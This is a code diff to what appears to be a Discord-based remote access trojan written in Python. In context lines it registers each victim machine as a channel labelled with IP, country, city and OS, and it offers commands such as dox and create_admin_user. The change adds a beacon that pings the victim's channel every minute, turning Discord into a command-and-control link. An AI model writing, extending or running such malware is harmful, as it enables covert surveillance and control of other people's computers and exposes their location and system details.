@@ -1,5 +1,5 @@
 import discord
-from discord.ext import commands
+from discord.ext import commands, tasks
 from discord.ext.commands import bot
 from dotenv import load_dotenv
 import threading
@@ -14,10 +14,11 @@ from features.screenRecord import *
 from features.windows import *
 import json
 import re
-import asyncio
 
 
-__DISCORD_TARGETS_CHANNEL_NAME = "targets"
+__DISCORD_TARGETS_CHANNEL_NAME  = "targets"
+__DISCORD_GUILD_ID              = int(os.environ.get("DISCORD_GUILD_ID")) # should be in int type!
+__TARGET_PING_DELAY_IN_MINUTES  = 1
 
 
 def main():
@@ -44,6 +45,8 @@ def main():
         if identifier not in targets_identifiers:
             channel_name = await guild.create_text_channel(identifier, topic=f"IP: {ip} | COUTRY: {country} | CITY: {city} | OS: {platform.platform()}")
             print(f"Created new channel: {channel_name}")
+
+        ping.start(bot)
 
     # this blob is for helping the website backend
     @bot.event
@@ -76,19 +79,15 @@ def main():
             await create_admin_user(await bot.get_context(message))
         elif re.match(r'!help',message.content):
             await help(await bot.get_context(message))
-        elif re.match(r'!ping',message.content):
-            await ping(await bot.get_context(message))
 
 
-    @bot.command()
-    async def ping(ctx):
-        if ctx.channel.name != generate_uuid():
-            return
+    @tasks.loop(minutes=__TARGET_PING_DELAY_IN_MINUTES)
+    async def ping(bot):
+        guild = bot.get_guild(__DISCORD_GUILD_ID)
+        channel = discord.utils.get(guild.channels, name=generate_uuid())
 
-        # let the observer start waiting for the message
-        await asyncio.sleep(1)
-
-        await ctx.reply('pong!')
+        if channel:
+            await channel.send('ping!')
 
     @bot.command()
     async def dox(ctx):
@@ -223,6 +222,7 @@ def main():
                        "!safe_disconnect -> Close the bot safely, will close all created threads\n"
                        "USage: !safe_disconnect\n\n"
                        "------------------------------- HELP -------------------------------")
+
 
     bot.run(token)
     
